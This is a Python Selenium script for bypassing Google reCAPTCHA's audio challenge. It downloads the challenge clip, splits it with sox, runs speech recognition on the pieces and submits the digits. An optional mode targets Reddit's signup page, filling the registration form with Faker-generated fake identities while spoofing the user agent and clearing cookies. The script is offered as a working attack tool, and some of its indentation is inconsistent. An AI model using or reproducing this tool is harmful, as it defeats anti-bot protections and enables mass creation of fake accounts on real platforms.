from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By
from selenium import webdriver
from bs4 import BeautifulSoup
from random import uniform
from time import sleep
from faker import Faker
from scipy.io import wavfile

import sys
import logging
import random
import os
import urllib
import time
import audio
import threading
import argparse

# use the max amplitude to filter out pauses
AMP_THRESHOLD = 2500
ATTACK_AUDIO = False
ATTACK_IMAGES = True
ATTACK_REDDIT = False
CHROMEDRIVER_PATH = ""
LEVEL = logging.DEBUG

parser = argparse.ArgumentParser()
group = parser.add_mutually_exclusive_group()
group.add_argument("--image", action='store_true', help="attack image recaptcha")
group.add_argument("--audio", action='store_true', help="attack audio recaptcha")
parser.add_argument("--driver", action="store", help="specify custom chromedriver path")
parser.add_argument("--reddit", action="store_true", help="run attack against Reddit's recaptcha")
parser.add_argument("--level", action="store", help="set log level", default="debug", choices=("debug", "warning"))

args = parser.parse_args()
ATTACK_IMAGES = args.image
ATTACK_AUDIO = args.audio
ATTACK_REDDIT = args.reddit
CHROMEDRIVER_PATH = args.driver

if not ATTACK_AUDIO and not ATTACK_IMAGES:
    parser.print_help()
    sys.exit()
############################## UTIL FUNCTIONS #############################
def init(task_type):
    global TASK_PATH, TASK_DIR, TASK_NUM, TASK
    TASK_DIR = os.path.join(task_type, "task")
    TASK_NUM = 1

    while os.path.isdir(TASK_DIR+str(TASK_NUM)):
        TASK_NUM += 1
    if not os.path.isdir(TASK_DIR+str(TASK_NUM)):
        os.mkdir(TASK_DIR+str(TASK_NUM))
        logging.info("Making "+ TASK_DIR+str(TASK_NUM))
    TASK = "task"+str(TASK_NUM)
    TASK_PATH = os.path.join(task_type, TASK)


def wait_between(a, b):
    rand = uniform(a, b)
    sleep(rand)


###########################AUDIO################################
def test_all(start=100, end=101):
    global TASK_PATH
    TASK_TYPE = "data"
    timings = []
    for task_num in range(start, end):
        try:
            TASK = "task"+str(task_num)
            TASK_PATH = TASK_TYPE+"/"+TASK
            AUDIO_FILE = TASK_PATH+"/"+TASK #+ ".mp3"
            num_str, time = get_numbers(AUDIO_FILE, TASK_PATH+"/")
            print(num_str, time)
            timings.append(time)
        except:
            pass
    print(timings)
    print(sum(timings)/float(len(timings)))

def get_numbers(audio_file, parent_dir):
    global AMP_THRESHOLD
    mp3_file = audio_file + ".mp3"
    wav_file = audio_file + ".wav"
    print("converting from " + mp3_file + " to " + wav_file)
    os.system("echo 'y' | ffmpeg -i "+mp3_file+" "+wav_file + "&> /dev/null")
    # split audio file on silence
    os.system("sox -V3 "+wav_file+" "+audio_file+"_.wav silence -l 0 1 0.5 0.1% : newfile : restart &> /dev/null")
    files = [f for f in os.listdir(parent_dir) if "_0" in f]
    audio_filenames = []
    # remove audio files that are only silence
    for f in files:
        _, snd = wavfile.read(TASK_PATH + "/" + f)
        amp = max(snd)
        print(f + ":" + str(amp))
        if amp > AMP_THRESHOLD: # skip this file
            audio_filenames.append(parent_dir+f)
        else:
            os.system("rm " + parent_dir+f)
    # run speech recognition on the individual numbers
    # num_str = ""
    # for f in sorted(audio_filenames):
    #     print f
    #     num_str += str(audio.getNum(f))
    # print(num_str)
    return audio.getNums(TASK_PATH, audio_filenames)

def type_like_bot(driver, element, string):
    driver.find_element(By.ID, element).send_keys(string)
    wait_between(0.5, 2)

def type_like_human(driver, element, string):
    driver.find_element(By.ID, element).click()
    for c in string:
        driver.find_element(By.ID, element).send_keys(c)
        wait_between(0.0, 0.1)
    wait_between(0.5, 2)

type_style = type_like_bot

def fill_out_profile(driver):
    fake = Faker()
    user = fake.simple_profile()
    username = user["username"]
    email = user["mail"].replace("@", str(random.randint(10000, 99999))+"@")
    password = fake.password()
    wait_between(1, 2)
    type_style(driver, "user_reg", username)
    type_style(driver, "passwd_reg", password)
    type_style(driver, "passwd2_reg", password)
    type_style(driver, "email_reg", email)

##############################  MAIN  ##############################
def main():
    logging.basicConfig(stream=sys.stderr, level=LEVEL)
    chrome_options = webdriver.ChromeOptions()
    chrome_options.add_argument("--disable-bundled-ppapi-flash")
    chrome_options.add_argument("--incognito")
    chrome_options.add_argument("user-agent=Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.109 Safari/537.36")
    chrome_options.add_argument("--disable-plugins-discovery")

    
    if CHROMEDRIVER_PATH:
        driver = webdriver.Chrome(CHROMEDRIVER_PATH, chrome_options=chrome_options)
        logging.debug("[*] Starting custom chromedriver %s" % CHROMEDRIVER_PATH) 
    else:
        driver = webdriver.Chrome(chrome_options=chrome_options)
        logging.debug("[*] Starting system default chromedriver")
    
    driver = webdriver.Chrome(chrome_options=chrome_options)
    driver.delete_all_cookies()
    agent = driver.execute_script("return navigator.userAgent")
    logging.debug("[*] Cookies cleared")
    logging.debug("[ ] Starting driver with user agent %s" % agent)
    
    if ATTACK_REDDIT:
        logging.info("[*] Starting attack on Reddit's recaptcha")
        driver.get("http://reddit.com")
        driver.find_element(By.XPATH, "//*[@id=\"header-bottom-right\"]/span[1]/a").click()
        logging.debug("[*] Filling out Reddit registration form")
        fill_out_profile(driver)
        WebDriverWait(driver, 60).until(EC.visibility_of_element_located((By.XPATH, "//*[@id=\"register-form\"]/div[6]/div/div/div/iframe")))
        iframeSwitch = driver.find_element(By.XPATH, "//*[@id=\"register-form\"]/div[6]/div/div/div/iframe")
    else:
        logging.info("[*] Starting attack on local site")
        driver.get("http://ubuntu-jeffermendoza.c9users.io/catcha/1.html")
	buttons = driver.find_element(By.XPATH,"//*[@class='solid fat info button']")
        buttons.click()
        iframeSwitch = driver.find_element(By.XPATH, "//*[@class=\"g-recaptcha\"]/div/div/iframe")
    driver.delete_all_cookies()
    driver.switch_to.frame(iframeSwitch)
    #ActionChains(driver).move_to_element(iframeSwitch).perform()
    driver.delete_all_cookies()
    logging.info("[*] Recaptcha located. Engaging")
    WebDriverWait(driver, 30).until(EC.presence_of_element_located((By.ID, "recaptcha-anchor")))
    ele = driver.find_element(By.ID, "recaptcha-anchor")
    #ActionChains(driver).move_to_element(ele).perform()
    ele.click()
    driver.switch_to.default_content()  

    #WebDriverWait(driver, 30).until(EC.presence_of_element_located((By.CSS_SELECTOR, "iframe[title=\"recaptcha challenge\"]")))
    #iframe = driver.find_element(By.CSS_SELECTOR, "iframe[title=\"recaptcha challenge\"]")
    #time.sleep(10)
    #iframe = driver.find_element_by_xpath("//div[contains(@id, 'rc-imageselect')]")
    #driver.switch_to.frame(iframe)
    #WebDriverWait(driver, 30).until(EC.presence_of_element_located((By.ID, "rc-imageselect")))
    
    if ATTACK_IMAGES:
        print("No uncaptcha for image challenge")

    elif ATTACK_AUDIO:
        #WebDriverWait(driver, 30).until(EC.presence_of_element_located((By.ID, "recaptcha-audio-button")))
        time.sleep(30)
        #driver.find_element(By.ID, "recaptcha-audio-button").click()
	iframe = driver.find_elements_by_css_selector("iframe")[1]
	driver.switch_to.frame(iframe)
        driver.find_element_by_id("recaptcha-audio-button").click()

        guess_again = True

        while guess_again:
            init("audio")
            WebDriverWait(driver, 30).until(EC.presence_of_element_located((By.ID, "audio-source")))
            # Parse table details offline
            body = driver.find_element(By.CSS_SELECTOR, "body").get_attribute('innerHTML').encode("utf8")
            soup = BeautifulSoup(body, 'html.parser')
            link = soup.findAll("a", {"class": "rc-audiochallenge-tdownload-link"})[0]
            urllib.urlretrieve(link["href"], TASK_PATH + "/" + TASK + ".mp3")
            guess_str = get_numbers(TASK_PATH + "/" + TASK, TASK_PATH + "/")
            type_style(driver, "audio-response", guess_str)
            # results.append(guess_str)
            wait_between(0.5, 3)
            driver.find_element(By.ID, "recaptcha-verify-button").click()
            wait_between(1, 2.5)
            try:
                logging.debug("Checking if Google wants us to solve more...")
                driver.switch_to.default_content()
                driver.switch_to.frame(iframeSwitch)
                checkmark_pos = driver.find_element(By.CLASS_NAME, "recaptcha-checkbox-checkmark").get_attribute("style")
                guess_again = not (checkmark_pos == "background-position: 0 -600px")
                driver.switch_to.default_content()
                iframe = driver.find_element(By.CSS_SELECTOR, "iframe[title=\"recaptcha challenge\"]")
                driver.switch_to.frame(iframe)
            except Exception as e:
                print(e)
                guess_again = False
  
    input("")
main()
